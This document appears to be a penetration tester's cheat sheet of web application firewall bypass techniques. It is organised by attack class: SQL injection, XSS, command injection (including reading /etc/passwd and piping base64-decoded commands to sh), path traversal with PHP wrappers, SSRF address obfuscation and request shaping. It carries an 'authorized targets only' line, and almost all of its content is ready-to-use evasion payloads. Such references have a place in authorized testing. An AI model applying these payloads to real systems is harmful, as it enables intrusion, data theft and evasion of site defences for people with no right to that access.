# WAF bypass — payload transforms by class

> Reference for `payloads-waf-bypass`. Authorized targets only. Bisect first to find the
> blocked token, then apply the matching transform.

## SQLi
- Comments: `UNION SELECT` → `UNION/**/SELECT`, `/*!50000UNION*/` (MySQL versioned comment)
- Whitespace: space → `/**/`, `%0a`, `%09`, `+`; `UNION` → `%55NION` (url-encoded)
- Logic: `OR` → `||`, `AND` → `&&`; `=` → `LIKE`, `<>`/`IN`
- Case/encoding: `SeLeCt`, double-URL-encode, hex string literals `0x61`
- `sqlmap --tamper=space2comment,between,charencode`

## XSS
- Tags: `<script>` blocked → `<svg onload=...>`, `<img src=x onerror=...>`, `<details ontoggle=...>`
- Events: `onerror`→`onpointerenter`, `onfocus` (+`autofocus`)
- Encoding: HTML entities `&#x61;`, JS unicode `a`, `String.fromCharCode`, base64+`atob`
- No-parens: `alert` blocked → `alert\`1\``, `(alert)(1)`, `top['ale'+'rt']`

## Command injection
- Separators: `;` `|` `&&` `%0a` `$(...)` `` `...` ``
- Spaces: `${IFS}`, `<`, `{cat,/etc/passwd}`, `$IFS$9`
- Obfuscate: `i''d`, `who$@ami`, `c\at`, base64 `echo <b64>|base64 -d|sh`

## LFI / path traversal
- `../` → `..%2f`, `..%252f` (double), `....//`, `..%c0%af` (overlong), null `%00`
- Wrappers: `php://filter/convert.base64-encode/resource=`, `data://`, `expect://`

## SSRF
- IP forms: decimal `2130706433`, octal `0177.0.0.1`, hex `0x7f000001`, `[::]`, `127.0.0.1.nip.io`
- Tricks: `@` (`http://allowed@attacker`), `#`, redirect chains, DNS rebinding

## Generic request shaping
- JSON ↔ form-encoded swap; add duplicate params (HPP); change `Content-Type`
- Chunked transfer-encoding; oversized junk before payload; move payload to `X-Forwarded-For`/headers
